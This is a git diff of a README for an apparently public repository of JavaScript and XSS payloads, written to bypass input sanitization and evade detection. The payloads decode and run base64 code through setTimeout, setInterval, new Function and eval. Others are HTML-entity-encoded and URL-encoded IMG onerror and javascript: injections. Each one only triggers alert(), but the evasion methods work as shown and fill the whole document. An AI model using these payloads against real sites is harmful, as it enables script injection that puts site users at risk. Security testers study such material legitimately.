@@ -1,18 +1,19 @@
+# JSMindx
+JSMindx Repository
 A list of payloads that I generated in order to bypass some sanitizations and restrictions or avoid triggering alert.
 
-|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
-||                    Made By Sami AKA Phantimoman                                                                 ||
-||                     Payloads made for educational purposes only                                     ||||||||||||||
-||                                                                                                                 ||
-||                                                                                                     ||||||||||||||
-||                                                                                                                 ||
-|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+![image](https://github.com/Phantomiman/JSMindx/assets/119011920/b666b9b4-3c23-42c6-bcc8-6d754ce1f926)
+
+
+
 
 1.Timeout usage with atob base64code decoding.
 
 const base64Code = "YWxlcnQoIlNhbWkgTWlyb3YiKQ=="; const decodedCode = atob(base64Code); const executeCode = new Function(decodedCode); setTimeout(executeCode, 2000);
 
 2. SetInterval with atob and base64 payload.
+
+
 setInterval(atob("YWxlcnQoIlNhbWkgTWlyb3YiKQ=="),2000);
 
 Obfuscated version:
@@ -27,4 +28,16 @@ UTF-8.JP Obfuscations:
 
 3. Promise function leads to base64 decoding and execution with eval (Most of the vulnerable paramteres defending from the eval function try to obfuscate it or find any alternative for execution).
 new Promise(resolve => { setTimeout(() => { const base64Code = "YWxlcnQoIlNhbWkgTWlyb3YiKQ=="; const decodedCode = atob(base64Code); eval(decodedCode); resolve(); }, 2000); });
+
+
+
+4. Event handling IMG SRC.
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+5. Event handling IMG SRC payload.
+%22%3E%3Cimg%20/x11src=x%20onerror=%22javascript:alert(1)%22%3E
+
+6. Event handling IMG SRC
+%3CIMG%20SRC=JaVaScRiPt:alert('X')%3E
 
